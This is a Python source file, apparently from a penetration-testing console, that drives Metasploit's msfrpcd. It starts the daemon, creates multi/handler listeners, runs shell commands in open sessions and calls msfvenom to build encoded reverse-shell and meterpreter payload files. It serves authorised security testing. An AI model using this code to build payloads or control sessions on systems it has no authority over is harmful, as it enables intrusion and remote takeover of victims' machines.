"""Metasploit (msfrpcd) runtime integration -- trimmed port.

Ported from PentestManusWeb ``system/msf_runtime.py`` (AGPL-3.0-only).
Manages the msfrpcd daemon lifecycle and wraps the MessagePack-RPC API
(auth.login -> job.list / session.list / module execution) plus msfvenom
payload generation.

Dependency policy: ``msgpack`` is optional (``pip install -e ".[msf]"``).
When it is missing every RPC call fails fast with a stable
``msfrpcd-unavailable`` style error and the console shows the msf tab in
degraded mode instead of crashing. msfvenom / msfrpcd binaries are located
via PATH; nothing is installed by this module.
"""

from __future__ import annotations

import base64
import json
import secrets
import shutil
import subprocess
from dataclasses import dataclass
from pathlib import Path
from typing import Any

MSF_PAYLOAD_PRESETS = [
    "linux/x64/meterpreter/reverse_tcp",
    "linux/x86/meterpreter/reverse_tcp",
    "windows/x64/meterpreter/reverse_tcp",
    "windows/x86/meterpreter/reverse_tcp",
    "linux/x64/shell_reverse_tcp",
    "windows/x64/shell_reverse_tcp",
    "cmd/unix/reverse_bash",
    "cmd/unix/reverse_python",
]

MSF_FORMATS = ["exe", "elf", "psh", "py"]


class MsfRpcError(Exception):
    def __init__(self, code: str, message: str):
        super().__init__(message)
        self.code = code
        self.message = message


@dataclass
class MsfConfig:
    host: str = "127.0.0.1"
    port: int = 55553
    username: str = "msf"
    password: str = ""
    ssl: bool = True


@dataclass
class MsfStatus:
    daemon_running: bool = False
    connected: bool = False
    configured: bool = False
    available: bool = True  # False when msgpack dependency is missing
    version: str = ""
    reason: str = ""


_CONFIG_DIR = Path(__file__).resolve().parents[1] / "msf_runtime" / "config"
_CONFIG_PATH = _CONFIG_DIR / "msf_rpc.json"

_daemon_proc: subprocess.Popen | None = None


def _load_config() -> MsfConfig:
    cfg = MsfConfig()
    if _CONFIG_PATH.exists():
        try:
            data = json.loads(_CONFIG_PATH.read_text())
            cfg.host = data.get("host", cfg.host)
            cfg.port = int(data.get("port", cfg.port))
            cfg.username = data.get("username", cfg.username)
            cfg.password = data.get("password", "") or secrets.token_urlsafe(16)
            cfg.ssl = bool(data.get("ssl", True))
            return cfg
        except Exception:
            pass
    cfg.password = cfg.password or secrets.token_urlsafe(16)
    return cfg


def _save_config(cfg: MsfConfig) -> None:
    _CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    _CONFIG_PATH.write_text(
        json.dumps(
            {
                "host": cfg.host,
                "port": cfg.port,
                "username": cfg.username,
                "password": cfg.password,
                "ssl": cfg.ssl,
            },
            indent=2,
        )
    )


def get_config(masked: bool = True) -> dict[str, Any]:
    cfg = _load_config()
    return {
        "host": cfg.host,
        "port": cfg.port,
        "username": cfg.username,
        "password": "********" if masked and cfg.password else "",
        "ssl": cfg.ssl,
    }


def update_config(
    *, host: str, port: int, username: str, password: str, ssl: bool
) -> dict[str, Any]:
    cfg = _load_config()
    cfg.host = host or cfg.host
    cfg.port = int(port or cfg.port)
    cfg.username = username or cfg.username
    if password:
        cfg.password = password
    cfg.ssl = bool(ssl)
    _save_config(cfg)
    return get_config(masked=True)


def _msgpack_available() -> bool:
    try:
        import msgpack  # noqa: F401

        return True
    except ImportError:
        return False


def _msfrpcd_path() -> str | None:
    return shutil.which("msfrpcd")


def _msfvenom_path() -> str | None:
    return shutil.which("msfvenom")


def daemon_status() -> MsfStatus:
    status = MsfStatus(configured=_CONFIG_PATH.exists())
    if not _msgpack_available():
        status.available = False
        status.reason = "msgpack 未安装（pip install -e '.[msf]'）；MSF 集成处于降级模式"
        return status
    if not _msfrpcd_path():
        status.reason = "未找到 msfrpcd（请安装 metasploit-framework）"
        return status
    status.daemon_running = _daemon_proc is not None and _daemon_proc.poll() is None
    try:
        rpc = MsfRpcClient.from_config()
        version = rpc.core_version()
        status.connected = True
        status.version = version
    except MsfRpcError:
        status.reason = "RPC 未连接（守护进程未运行或凭据不匹配）"
    except OSError:
        # Belt-and-suspenders: MsfRpcClient normalizes socket errors already,
        # but core_version() runs over the live socket.
        status.reason = "RPC 未连接（连接中断）"
    return status


def start_daemon() -> MsfStatus:
    global _daemon_proc
    path = _msfrpcd_path()
    if not path:
        raise MsfRpcError("msfrpcd-missing", "未找到 msfrpcd 可执行文件")
    if not _msgpack_available():
        raise MsfRpcError("dependency-missing", "msgpack 未安装；先执行 pip install -e '.[msf]'")
    cfg = _load_config()
    if _daemon_proc and _daemon_proc.poll() is None:
        return daemon_status()
    _daemon_proc = subprocess.Popen(
        [
            path,
            "-P",
            cfg.password,
            "-U",
            cfg.username,
            "-a",
            cfg.host,
            "-p",
            str(cfg.port),
            *(["-S"] if not cfg.ssl else []),  # -S DISABLES SSL in msfrpcd
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return daemon_status()


def stop_daemon() -> MsfStatus:
    global _daemon_proc
    if _daemon_proc and _daemon_proc.poll() is None:
        _daemon_proc.terminate()
        try:
            _daemon_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _daemon_proc.kill()
    _daemon_proc = None
    return daemon_status()


class MsfRpcClient:
    """Minimal MessagePack-RPC client for msfrpcd (lazy msgpack import)."""

    def __init__(self, host: str, port: int, username: str, password: str, ssl: bool):
        if not _msgpack_available():
            raise MsfRpcError("dependency-missing", "msgpack 未安装")
        import socket
        import ssl as ssl_lib

        self._msgpack = __import__("msgpack")
        self._token: str | None = None
        try:
            sock = socket.create_connection((host, port), timeout=8)
            if ssl:
                # msfrpcd ships a self-signed cert by default; identity is
                # established by the RPC password, not TLS.
                context = ssl_lib._create_unverified_context()
                sock = context.wrap_socket(sock)
            self._sock = sock
            self._counter = 0
            self._login(username, password)
        except OSError as exc:
            raise MsfRpcError("connection-failed", f"msfrpcd 连接失败: {exc}") from exc

    @classmethod
    def from_config(cls) -> "MsfRpcClient":
        cfg = _load_config()
        return cls(cfg.host, cfg.port, cfg.username, cfg.password, cfg.ssl)

    def _call(self, method: str, *args: Any) -> Any:
        self._counter += 1
        payload = self._msgpack.packb([method, list(args)])
        self._sock.sendall(payload)
        chunks = []
        while True:
            chunk = self._sock.recv(65536)
            if not chunk:
                raise MsfRpcError("connection-closed", "msfrpcd 连接中断")
            chunks.append(chunk)
            try:
                result = self._msgpack.unpackb(b"".join(chunks), raw=False)
                break
            except Exception:
                continue
        if isinstance(result, dict) and result.get("error"):
            raise MsfRpcError("rpc-error", str(result.get("error_message") or result.get("error")))
        if isinstance(result, dict) and result.get("result") == "failure":
            raise MsfRpcError(
                "rpc-failure",
                str(result.get("error_message") or result.get("error_code") or "failure"),
            )
        return (
            result.get("response") if isinstance(result, dict) and "response" in result else result
        )

    def _login(self, username: str, password: str) -> None:
        result = self._call("auth.login", username, password)
        self._token = result.get("token") if isinstance(result, dict) else None
        if not self._token:
            raise MsfRpcError("auth-failed", "msfrpcd 认证失败")

    def core_version(self) -> str:
        result = self._call("core.version", self._token)
        version = (
            ".".join(str(part) for part in result.values()) if isinstance(result, dict) else ""
        )
        return version

    def list_listeners(self) -> list[dict[str, Any]]:
        jobs = self._call("job.list", self._token) or {}
        listeners = []
        for job_id, info in (jobs or {}).items():
            item = info if isinstance(info, dict) else {}
            listeners.append(
                {
                    "jobId": int(job_id),
                    "name": item.get("name") or "",
                    "payload": (item.get("datastore") or {}).get("PayloadName", ""),
                    "lhost": (item.get("datastore") or {}).get("LHOST", ""),
                    "lport": (item.get("datastore") or {}).get("LPORT", ""),
                }
            )
        return listeners

    def stop_listener(self, job_id: int) -> None:
        self._call("job.stop", self._token, job_id)

    def create_listener(self, *, payload: str, lhost: str, lport: int) -> int:
        datastore = {"LHOST": lhost, "LPORT": lport, "ExitOnSession": False}
        result = self._call("module.execute", self._token, "exploit", "multi/handler", datastore)
        job_id = result.get("job_id") if isinstance(result, dict) else None
        if job_id is None:
            raise MsfRpcError("listener-failed", "创建监听 handler 失败")
        return int(job_id)

    def list_sessions(self) -> list[dict[str, Any]]:
        raw = self._call("session.list", self._token) or {}
        sessions = []
        for sid, info in (raw or {}).items():
            sessions.append(
                {
                    "id": str(sid),
                    "type": info.get("type") or "",
                    "info": info.get("desc") or info.get("info") or "",
                    "tunnelLocal": info.get("tunnel_local") or "",
                    "tunnelPeer": info.get("tunnel_peer") or "",
                    "username": info.get("username") or "",
                    "hostname": info.get("host") or "",
                    "arch": info.get("arch") or "",
                    "platform": info.get("platform") or "",
                }
            )
        return sessions

    def run_session_command(self, session_id: str, command: str) -> str:
        result = self._call("session.shell_write", self._token, int(session_id), command + "\n")
        if not isinstance(result, dict) or "write_count" not in result:
            raise MsfRpcError("shell-write-failed", "写入命令失败")
        import time

        time.sleep(0.8)
        read = self._call("session.shell_read", self._token, int(session_id))
        return (read or {}).get("data", "") if isinstance(read, dict) else ""

    def close_session(self, session_id: str) -> None:
        self._call("session.kill", self._token, int(session_id))


def generate_payload(*, payload: str, lhost: str, lport: int, fmt: str) -> dict[str, Any]:
    """Wrap msfvenom to produce a raw payload artifact."""
    msfvenom = _msfvenom_path()
    if not msfvenom:
        raise MsfRpcError("msfvenom-missing", "未找到 msfvenom 可执行文件")
    if fmt not in MSF_FORMATS:
        raise MsfRpcError("bad-format", f"不支持的格式 {fmt}；可选：{', '.join(MSF_FORMATS)}")
    fmt_args = {
        "exe": ["-f", "exe", "-e", "x86/shikata_ga_nai"],
        "elf": ["-f", "elf"],
        "psh": ["-f", "psh"],
        "py": ["-f", "python"],
    }[fmt]
    suffix = {"exe": "exe", "elf": "elf", "psh": "ps1", "py": "py"}[fmt]
    proc = subprocess.run(
        [msfvenom, "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", *fmt_args, "-o", "-"],
        capture_output=True,
        timeout=120,
    )
    if proc.returncode != 0:
        raise MsfRpcError("msfvenom-failed", proc.stderr.decode("utf-8", "replace")[:500])
    return {
        "filename": f"payload_{payload.split('/')[-1]}_{lport}.{suffix}",
        "contentBase64": base64.b64encode(proc.stdout).decode("ascii"),
        "size": len(proc.stdout),
    }
